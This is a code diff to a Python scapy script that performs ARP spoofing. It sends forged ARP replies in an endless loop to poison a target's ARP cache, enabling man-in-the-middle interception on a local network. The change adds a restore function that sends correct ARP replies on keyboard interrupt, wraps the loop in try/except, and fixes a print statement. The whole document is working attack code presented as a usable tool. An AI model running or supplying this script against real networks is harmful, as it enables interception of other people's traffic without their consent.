@@ -20,15 +20,28 @@ def spoof(target_ip,spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet,verbose=False)
-   
+    
+def restore(destination_ip,source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
+    scapy.send(packet,verbose=False)   
 	
 options = get_parse()
 
 
 sent_packets = 0
-while True:
-    spoof(options.target_ip, options.spoof_ip)
-    sent_packets = sent_packets + 1
-    time.sleep(2)
-    print("\r[+] Sent " + str(packets_sent_count), end="")
+
+try:
+    while True:
+        spoof(options.target_ip, options.spoof_ip)
+        sent_packets = sent_packets + 1
+        time.sleep(2)
+        print("[+] Packet send ->>" + str(sent_packets))
+   
+except KeyboardInterrupt:
+    print("[-] Keyboard error...."),
+    restore(options.target_ip,options.spoof_ip)
+    
+
 
